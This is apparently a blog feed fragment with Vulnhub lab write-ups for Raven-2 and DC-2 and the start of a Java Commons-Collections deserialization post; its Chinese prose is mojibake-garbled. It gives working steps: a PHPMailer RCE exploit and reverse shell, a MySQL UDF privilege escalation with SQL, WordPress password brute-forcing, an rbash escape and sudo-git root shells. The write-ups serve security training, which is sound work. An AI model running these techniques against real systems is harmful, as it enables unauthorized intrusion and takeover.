        <content type="html"><![CDATA[<h2 id="é¶æœºåœ°å€"><a href="#é¶æœºåœ°å€" class="headerlink" title="é¶æœºåœ°å€"></a>é¶æœºåœ°å€</h2><p><code>https://www.vulnhub.com/entry/raven-2,269/</code></p><h2 id="flagâ€”1"><a href="#flagâ€”1" class="headerlink" title="flagâ€”1"></a>flagâ€”1</h2><p>æ‰«æå­˜æ´»ä¸»æœº<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511958.png" alt="image-20230530151117902"><br>é€šè¿‡é¶æœºmacåœ°å€åˆ¤æ–­IPä¸º<code>192.168.75.135</code>ç„¶ånmapæ‰«ä¸€ä¸‹ï¼Œçœ‹çœ‹å¼€æ”¾ç«¯å£<br><code>nmap -A -p- -v  192.168.75.135</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511132.png" alt="image-20230530151136092"><br>ä¸‰ä¸ªå¼€æ”¾ç«¯å£ï¼Œç„¶ådirsearchæ‰«ä¸€ä¸‹ç›®å½•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511273.png" alt="image-20230530151147237"><br>è®¿é—®&#x2F;vendorå­˜åœ¨ä¸€ä¸ªç›®å½•éå†æ¼æ´ï¼Œåœ¨PATHä¸‹æ‰¾åˆ°flag1<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512438.png" alt="image-20230530151208411"></p><h2 id="flagâ€”2ï¼Œ3"><a href="#flagâ€”2ï¼Œ3" class="headerlink" title="flagâ€”2ï¼Œ3"></a>flagâ€”2ï¼Œ3</h2><p>è®¿é—®README.mdå‘ç°å­˜åœ¨ä¸€ä¸ªphpmaileræœåŠ¡ï¼Œå¹¶ä¸”åœ¨VERSIONä¸‹çœ‹çš„ç‰ˆæœ¬ä¸º5.2.16æœäº†ä¸€ä¸‹18ä»¥ä¸‹å­˜åœ¨<strong>PHPMailerè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</strong>æœ¬æ¥æƒ³æ‰‹å·¥åˆ©ç”¨ï¼Œä½†æ˜¯å¤±è´¥äº†ï¼Œç›´æ¥åˆ©ç”¨<strong>searchsploit</strong>æœç´¢å¯ä»¥åˆ©ç”¨çš„æ¼æ´<br><code>searchsploit PHPMailer</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512376.png" alt="image-20230530151222302"><br>å°†pythoné‚£æ¡expæ‹·è´å‡ºæ¥ï¼Œç„¶åä¿®æ”¹ç›®æ ‡åœ°å€å’Œåå¼¹shellçš„åœ°å€ä»¥åŠä¸Šä¼ çš„è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/40974.py /home/joker27/æ¡Œé¢</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512462.png" alt="image-20230530151238409"><br>ç„¶åæ‰§è¡Œexpç”Ÿæˆåé—¨æ–‡ä»¶<br><code>python 40974.py</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512317.png" alt="image-20230530151254251"><br>ç›‘å¬ç«¯å£ï¼Œå…ˆè®¿é—®<a href="http://192.168.75.135/contact.php%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%AE%BF%E9%97%AE%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9%E6%88%90%E5%8A%9F">http://192.168.75.135/contact.phpç”Ÿæˆåé—¨æ–‡ä»¶ï¼Œç„¶åè®¿é—®åé—¨æ–‡ä»¶åå¼¹æˆåŠŸ</a><br>ä½¿ç”¨pythonè·å¾—ä¸€ä¸ªäº¤äº’å¼shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>æŸ¥çœ‹æƒé™ï¼Œæ˜¯ä¸€ä¸ªwww-dataæƒé™å¾ˆä½<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513510.png" alt="image-20230530151311480"><br>ä½¿ç”¨å‘½ä»¤<code>find / -name &quot;flag*&quot;</code>ç›´æ¥æœç´¢flagï¼ŒæŸ¥åˆ°flag2å’Œ3<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513241.png" alt="image-20230530151323212"><br>flag2ç›´æ¥å‘½ä»¤æ‰“å¼€å°±è¡Œï¼Œflag3æ˜¯ä¸€å¼ å›¾ç‰‡åœ¨webä¸‹è®¿é—®<code>http://192.168.75.135/wordpress/wp-content/uploads/2018/11/flag3.png</code>å³å¯å¾—åˆ°ï¼Œæœ€åä¸€ä¸ªflagè‚¯å®šå°±è¦ææƒäº†</p><h2 id="flagâ€“4-udfææƒ"><a href="#flagâ€“4-udfææƒ" class="headerlink" title="flagâ€“4(udfææƒ)"></a>flagâ€“4(udfææƒ)</h2><p>ä»¥å‰åªäº†è§£ä½†æ˜¯æ²¡ç©è¿‡udfææƒä¹Ÿæ˜¯æ‹¿è¿™ä¸ªé¶åœºç»ƒç»ƒ<br>ä½¿ç”¨LinEnum.shå¯¹Linuxè¿›è¡Œä¿¡æ¯æœé›†ï¼Œé¡¹ç›®åœ°å€ï¼š<code>https://github.com/rebootuser/LinEnum</code><br>åˆ©ç”¨pythonèµ·ä¸€ä¸ªä¸´æ—¶webæœåŠ¡ï¼Œpython3ä¸‹è¿è¡Œ<code>python -m http.server</code><br>æœåŠ¡é»˜è®¤ç«¯å£8000ï¼Œåˆ©ç”¨è¿™ä¸ªæœåŠ¡å°†LinEnum.shæ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºä¸Šè¿è¡Œï¼Œè¿™ä¸ªæ–¹æ³•åœ¨<strong>Vulnhubâ€”â€”Ai-Web1</strong>ä¹Ÿæœ‰è¿ç”¨ï¼Œä¸çŸ¥é“çš„å¯ä»¥å‚è€ƒæˆ‘å‰é¢çš„æ–‡ç« ï¼Œç„¶åä½¿ç”¨wgetè¿œç¨‹ä¸‹è½½shæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513476.png" alt="image-20230530151348411"><br>ç„¶åè¿è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œéœ€è¦åŠ æƒè¿è¡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514588.png" alt="image-20230530151402551"><br>å‡ºæ¥çš„ä¿¡æ¯å¾ˆå¤šï¼Œå‘ç°mysqlæ˜¯åœ¨rootä¸‹è¿è¡Œçš„ï¼Œå…¶å®ä¹Ÿå¯ä»¥æ‰§è¡Œå‘½ä»¤<code>ps aux | grep root</code>æŸ¥çœ‹ä»¥rootè¿è¡Œçš„è¿›ç¨‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514838.png" alt="image-20230530151412795"><br>æ‰€ä»¥å¦‚æœæ•°æ®åº“ç‰ˆæœ¬ä¸æ˜¯å¾ˆé«˜(&lt;&#x3D; 5.7.14ï¼Œ5.6.32ï¼Œ5.5.51)å°±å¯ä»¥ç”¨udfæ¥ææƒï¼Œå°±ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•å¾—åˆ°æ•°æ®åº“ç‰ˆæœ¬ï¼Œæœ€ç»ˆåœ¨å¦‚ä¸‹é…ç½®æ–‡ä»¶å¾—åˆ°mysqlçš„è´¦å·å¯†ç <br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514005.png" alt="image-20230530151425953"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514656.png" alt="image-20230530151438618"><br>è¿æ¥æ•°æ®åº“<code>mysql -uroot -pR@v3nSecurity</code><br>æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514125.png" alt="image-20230530151450089"><br><strong>æŸ¥çœ‹ secure_file_priv  çš„å€¼</strong><br>secure_file_priv æ˜¯ç”¨æ¥é™åˆ¶ load dumpfileã€into  outfileã€load_file() å‡½æ•°åœ¨å“ªä¸ªç›®å½•ä¸‹æ‹¥æœ‰ä¸Šä¼ æˆ–è€…è¯»å–æ–‡ä»¶çš„æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;secure%&#x27;;</span><br><span class="line">     å½“ secure_file_priv çš„å€¼ä¸º NULL ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡ºï¼Œæ­¤æ—¶æ— æ³•ææƒ</span><br><span class="line">     å½“ secure_file_priv çš„å€¼ä¸º /tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨ /tmp/ ç›®å½•ä¸‹ï¼Œæ­¤æ—¶å¯èƒ½ä¹Ÿæ— æ³•ææƒ</span><br><span class="line">     å½“ secure_file_priv çš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹ mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ï¼Œæ­¤æ—¶å¯ææƒ</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515020.png" alt="image-20230530151509989"><br>å¯ä»¥ä½¿ç”¨udfææƒï¼Œå¹¶ä¸”å¯¼å‡ºæ²¡åšé™åˆ¶ï¼Œkaliä½¿ç”¨å‘½ä»¤<code>searchsploit mysql</code> æ‰¾åˆ°åˆ©ç”¨exp<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515647.png" alt="image-20230530151520614"><br>å°†expå¤åˆ¶ç”Ÿæˆ<code>.so</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/1518.c //home/joker27/æ¡Œé¢</span><br><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -o udf.so 1518.o -lc</span><br><span class="line"></span><br><span class="line">å‚æ•°å«ä¹‰</span><br><span class="line">-g ç”Ÿæˆè°ƒè¯•ä¿¡æ¯</span><br><span class="line">-c ç¼–è¯‘ï¼ˆäºŒè¿›åˆ¶ï¼‰</span><br><span class="line">-sharedï¼šåˆ›å»ºä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œè¾“å…¥æ–‡ä»¶å¯ä»¥æ˜¯æºæ–‡ä»¶ã€æ±‡ç¼–æ–‡ä»¶æˆ–è€…ç›®æ ‡æ–‡ä»¶ã€‚</span><br><span class="line">-oï¼šæ‰§è¡Œå‘½ä»¤åçš„æ–‡ä»¶å</span><br><span class="line">-lcï¼š-l åº“ cåº“å</span><br></pre></td></tr></table></figure><p>åŒæ ·ç”¨pythonçš„ä¸´æ—¶æœåŠ¡å°†<code>.so</code>æ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºï¼Œæ¥ä¸‹æ¥çš„æ­¥éª¤å°±æ˜¯è‡ªå®šä¹‰ä¸€ä¸ªå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line"></span><br><span class="line">//åˆ›å»ºä¸€ä¸ªè¡¨å¹¶ä¸”åŒ…å«ä¸€ä¸ªblobå‹(blobå‹ç”¨äºå‚¨å­˜å¤§å‹äºŒè¿›åˆ¶å¯¹è±¡)çš„åˆ—</span><br><span class="line">create table foo(line blob);</span><br><span class="line"></span><br><span class="line">//å°†udf.soæ–‡ä»¶æ’å…¥è¡¨ä¸­</span><br><span class="line">insert into foo values(load_file(&#x27;/var/www/html/udf.so&#x27;));</span><br><span class="line"></span><br><span class="line">//å°†äºŒè¿›åˆ¶æ•°æ®å¯¼å‡ºåˆ°pluginç›®å½•ä¸‹</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br><span class="line"></span><br><span class="line">//åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°do_systemï¼Œç±»å‹ä¸ºintegerï¼Œåˆ«åudf.so</span><br><span class="line">create function do_system returns integer soname &#x27;udf.so&#x27;;</span><br><span class="line"></span><br><span class="line">//æŸ¥è¯¢æ˜¯å¦åˆ›å»ºæˆåŠŸ</span><br><span class="line">select * from mysql.func;</span><br><span class="line"></span><br><span class="line">//åˆ©ç”¨è‡ªå®šä¹‰å‡½æ•°æ”¹å˜findå‘½ä»¤æƒé™</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"></span><br><span class="line">//ä½¿ç”¨findææƒ</span><br><span class="line">touch hello</span><br><span class="line">find hello -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p>zè¿™é‡Œå†æ¸©ä¹ ä¸€éfindææƒï¼Œå°±æ˜¯éšä¾¿æŸ¥æ‰¾ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“ç„¶è¿™ä¸ªæ–‡ä»¶å¾—å­˜åœ¨ï¼Œå¯¹æŸ¥æ‰¾åˆ°çš„åˆ©ç”¨å‚æ•°<code>-exec</code>æ‰§è¡Œä¸€ä¸ªshellå‘½ä»¤ï¼Œç”±äºfindæ˜¯ä»¥rootè¿è¡Œçš„æ‰€ä»¥è¿™ä¸ªshellè‡ªç„¶ä¹Ÿå°±æ˜¯rootäº†<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515774.png" alt="image-20230530151533731"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515043.png"></p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-2</title>
      <link href="/2023/05/Vulnhub-DC-2/"/>
      <url>/2023/05/Vulnhub-DC-2/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>ä¸‹è½½å®Œåå°±ä¸€ä¸ªovaæ–‡ä»¶ï¼ŒVmwareæ‰“å¼€å°±è¡Œ</p><h2 id="flagâ€“1"><a href="#flagâ€“1" class="headerlink" title="flagâ€“1"></a>flagâ€“1</h2><p>è€æ­¥éª¤ï¼Œæ‰«æå­˜æ´»IP<br><code>arp-scan -l</code><br>é€šè¿‡macåœ°å€åˆ¤æ–­IPä¸º192.168.75.134<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071823280.png" alt="image-20230507182024787"><br>nmapæŸ¥çœ‹å…¨éƒ¨ç«¯å£ï¼Œ-vä¸ºæŸ¥çœ‹ç‰ˆæœ¬å·<br><code>nmap -A -p- -v 192.168.75.134</code><br>æœ‰ä¸€ä¸ª80ç«¯å£ï¼Œè¿˜æœ‰ä¸€ä¸ª7744æ”¾äº†ssh<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071824518.png" alt="image-20230507182437450"><br>è®¿é—®IPçš„æ—¶å€™å‘ç°è®¿é—®å¤±è´¥ï¼Œå¹¶ä¸”é‡å®šå‘åˆ°åŸŸå<code>dc-2</code>åŸå› ä¸ºæœ¬åœ°æ— æ³•è§£æåŸŸåï¼Œæ‰€ä»¥éœ€è¦ç¼–è¾‘&#x2F;etc&#x2F;hostsæ–‡ä»¶ï¼Œæ·»åŠ é¶æœºIPåœ°å€åŠå¯¹åº”åŸŸå</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.75.134  dc-2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071824150.png" alt="image-20230507182457099"><br>ç”±äºæ˜¯åœ¨kaliä¸‹å†™å…¥æ‰€ä»¥åªèƒ½åœ¨kaliä¸‹è®¿é—®ï¼Œç„¶ååœ¨é¡µé¢æ‰¾åˆ°flag1<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825846.png" alt="image-20230507182506788"><br>ç„¶åæ ¹æ®æç¤ºä¸‹ä¸€ä¸ªflagè¦ä½¿ç”¨kaliä¸‹çš„cewlï¼Œå¹¶ä¸”éœ€è¦ç™»å½•ï¼Œæ‰€ä»¥å¾…ä¼šå„¿è¦æ‰«ä¸€ä¸‹ç›®å½•</p><h2 id="flagâ€“2"><a href="#flagâ€“2" class="headerlink" title="flagâ€“2"></a>flagâ€“2</h2><p>å…ˆä½¿ç”¨cewlç”Ÿæˆä¸€ä¸‹å¯†ç å­—å…¸<br><code>cewl dc-2 -w dict.txt</code><br>ç„¶åä½¿ç”¨WPscanæšä¸¾ä¸€ä¸‹ç”¨æˆ·<br><code>wpscan --url dc-2 --enumerate u</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825397.png" alt="image-20230507182519333"><br>å¾—åˆ°ä¸‰ä¸ªç”¨æˆ·ï¼Œç„¶åä½¿ç”¨ä¸€å¼€å§‹ç”Ÿæˆçš„å­—å…¸è¿›è¡Œçˆ†ç ´<br><code>wpscan --url dc-2 --passwords dict.txt</code><br>å¾—åˆ°ä¸¤ä¸ªè´¦å·çš„å¯†ç <br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825746.png" alt="image-20230507182535717"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰«ä¸€ä¸‹åå°<code>dirb http://dc-2/ </code>å¾—åˆ°ç™»å½•åœ°å€ä¸º&#x2F;wp-adminï¼Œåˆ©ç”¨è´¦å·ç™»å½•æ‰¾åˆ°flag2<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825804.png" alt="image-20230507182547769"></p><h2 id="flagâ€“3"><a href="#flagâ€“3" class="headerlink" title="flagâ€“3"></a>flagâ€“3</h2><p>ç„¶ååˆ©ç”¨ä¸€ä¸‹ä¹‹å‰æ‰«çš„sshæœåŠ¡ï¼Œç”¨tomçš„è´¦å·ç™»ä¸€ä¸‹<br><code>ssh tom@192.168.75.134 -p 7744</code>å¯†ç å°±æ˜¯ä¹‹å‰é‚£ä¸ªå¯†ç ï¼Œç„¶ålså¯ä»¥çœ‹åˆ°flagï¼Œä½†æ˜¯è¿™é‡Œåšäº†rbashé™åˆ¶ï¼Œæœ€ç»ˆä½¿ç”¨viæ‰“å¼€å¾—åˆ°flag3<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826231.png" alt="image-20230507182601203"></p><h2 id="flagâ€“4"><a href="#flagâ€“4" class="headerlink" title="flagâ€“4"></a>flagâ€“4</h2><p>æ ¹æ®flag3æç¤ºåˆ‡æ¢åˆ°å¦ä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯è¿™é‡Œç”¨ä¸äº†suå‘½ä»¤ï¼Œç”¨äº†rbashåŒ…è£¹å¾—ç»•è¿‡ä¸€ä¸‹<br>å…ˆç®€å•çœ‹ä¸€ä¸‹rbashæ˜¯ä»€ä¹ˆ</p><h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>rbash(The restricted mode of bash),ä¹Ÿå°±æ˜¯é™åˆ¶å‹bashï¼›æ˜¯å¹³æ—¶æ‰€è°“çš„ restricted shellçš„ä¸€ç§ï¼Œä¹Ÿæ˜¯æœ€å¸¸è§çš„ restricted shellï¼ˆrbashã€kshã€rshç­‰ï¼‰æ¸—é€ä¸­é‡åˆ°restricted shellæ˜¯ä¸€ä»¶å¾ˆçƒ¦äººçš„äº‹ï¼Œæ€»æœ‰æœ‰ä¸€ç§æŸæ‰‹æŸè„šçš„æ„Ÿè§‰ï¼›ä¸‹é¢æˆ‘ä»¬å°±æ¥çœ‹çœ‹å¦‚ä½•çªç ´å®ƒã€‚</p><h3 id="0x01ã€rbashä¸­çš„é™åˆ¶ï¼ˆæ­£å› ä¸ºæœ‰è¿™äº›é™åˆ¶æˆ‘ä»¬æ‰è¦çªç ´å®ƒï¼‰"><a href="#0x01ã€rbashä¸­çš„é™åˆ¶ï¼ˆæ­£å› ä¸ºæœ‰è¿™äº›é™åˆ¶æˆ‘ä»¬æ‰è¦çªç ´å®ƒï¼‰" class="headerlink" title="0x01ã€rbashä¸­çš„é™åˆ¶ï¼ˆæ­£å› ä¸ºæœ‰è¿™äº›é™åˆ¶æˆ‘ä»¬æ‰è¦çªç ´å®ƒï¼‰"></a>0x01ã€rbashä¸­çš„é™åˆ¶ï¼ˆæ­£å› ä¸ºæœ‰è¿™äº›é™åˆ¶æˆ‘ä»¬æ‰è¦çªç ´å®ƒï¼‰</h3><ul><li>ä¸èƒ½ä½¿ç”¨cdå‘½ä»¤ï¼ˆæ„å‘³ç€ä¸èƒ½æ›´æ”¹ç›®å½•ï¼‰</li><li>ä¸èƒ½è®¾ç½®æˆ–å–æ¶ˆç¯å¢ƒå˜é‡ï¼šSHELLï¼Œ PATHï¼Œ ENVï¼Œ BASH_ENV</li><li>å¯¼å…¥åŠŸèƒ½å—é™</li><li>æŒ‡å®šåŒ…å«å‚æ•°â€™&#x2F;â€˜æˆ–â€™-â€˜çš„æ–‡ä»¶å(å³å‘½åä¸­ä¸èƒ½åŒ…å« â€˜&#x2F; â€˜ æˆ–â€™-â€˜)</li><li>ä¸èƒ½ä½¿ç”¨ä½¿ç”¨ &gt;ï¼Œ&gt;|ï¼Œ &lt;&gt;ï¼Œ &gt;&amp;ï¼Œ &amp;&gt;ï¼Œ &gt;&gt; ç­‰é‡å®šå‘æ“ä½œç¬¦</li><li>ä¸èƒ½ä½¿ç”¨â€™set + râ€™æˆ–â€™set + oâ€™å…³é—­<br>ä»ä¸Šè¾¹è¿™äº›é™åˆ¶å¯çŸ¥rbashçš„å­˜åœ¨æ˜¯ä¸ºäº†æé«˜å®‰å…¨æ€§ï¼Œä½†æ˜¯ä¸¥é‡å½±å“äº†æˆ‘ä»¬åœ¨ç›®æ ‡æœºå™¨ä¸Šçš„ä¿¡æ¯æ”¶é›†ï¼Œä»¥åŠå¸¸ç”¨çš„åå¼¹shell(å¤§éƒ¨åˆ†éœ€è¦ç”¨åˆ°é‡å®šå‘ç¬¦)<br>è¿™é‡Œç»•è¿‡æ–¹æ³•å¾ˆå¤šï¼Œæˆ‘ç›´æ¥ç”¨wpçš„æ–¹æ³•<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh  #è°ƒç”¨/bin/shå‘½ä»¤è§£é‡Šå™¨</span><br><span class="line">a  </span><br><span class="line">/bin/bash   #ä½¿ç”¨bashå‘½ä»¤è§£é‡Šå™¨</span><br><span class="line">export PATH=PATH:/bin:/sbin:/usr/bin:/usr/sbin  #è®¾ç½®ç¯å¢ƒå˜é‡</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826226.png" alt="image-20230507182618182"><br>åˆ‡æ¢æˆåŠŸï¼Œç„¶åè¿›å…¥jerryç›®å½•ä¸‹å¾—åˆ°flag4<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826271.png" alt="image-20230507182628216"></li></ul><h2 id="flagâ€“5"><a href="#flagâ€“5" class="headerlink" title="flagâ€“5"></a>flagâ€“5</h2><p>é€šè¿‡flag4æç¤ºä½¿ç”¨gitææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l    #æŸ¥çœ‹å¯ä»¥ä½¿ç”¨rootæƒé™æ— å¯†ç çš„å‘½ä»¤ï¼Œæœ‰gitå‘½ä»¤</span><br><span class="line">sudo git -p help #å¼ºåˆ¶è¿›å…¥äº¤äº’çŠ¶æ€</span><br><span class="line">!/bin/bash #æ‰“å¼€ä¸€ä¸ªç”¨æˆ·ä¸ºrootçš„shell</span><br><span class="line"></span><br><span class="line">æ³•2ï¼š</span><br><span class="line">sudo git help config #åœ¨æœ«è¡Œå‘½ä»¤æ¨¡å¼è¾“å…¥</span><br><span class="line">!/bin/bash æˆ–è€… !&#x27;sh&#x27; #æ‰“å¼€ä¸€ä¸ªç”¨æˆ·ä¸ºrootçš„shell</span><br></pre></td></tr></table></figure><p>ææƒæˆåŠŸï¼Œæ‹¿åˆ°æœ€åä¸€ä¸ªflag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826622.png" alt="image-20230507182637547"></p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾6</title>
      <link href="/2023/05/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE6/"/>
      <url>/2023/05/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE6/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>åŸºæœ¬ä¸Šå’ŒCC1å·®ä¸å¤š</p><blockquote><p>jdk8u71<br>Comoons-Collections 3.2.1</p></blockquote><h2 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h2><p>å‰åŠæ®µé“¾å­ï¼Œ<code>LazyMap</code> ç±»åˆ° <code>InvokerTransformer</code> ç±»æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ç›´æ¥åˆ° <code>LazyMap</code> ä¸‹ï¼Œè¿™é‡Œå…ˆé‡æ–°ä¸€è¾¹LazyMap ç±»è°ƒç”¨è®¡ç®—å™¨çš„ EXPï¼Œçœ‹å‚è€ƒåšå®¢è¯´å¤šå†™æœ‰åˆ©äºæ¯”é‚£äº›EXPç¡®å®æ˜¯è¿™æ ·ï¼Œèƒ½åŠ æ·±ç†è§£ï¼Œåæ­£æ²¡åå¤„ï¼Œå¹¶ä¸”æˆ‘å‘ç°è‡ªå·±åˆæœ‰ç‚¹å¿˜è®°äº†ã€‚ã€‚ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);  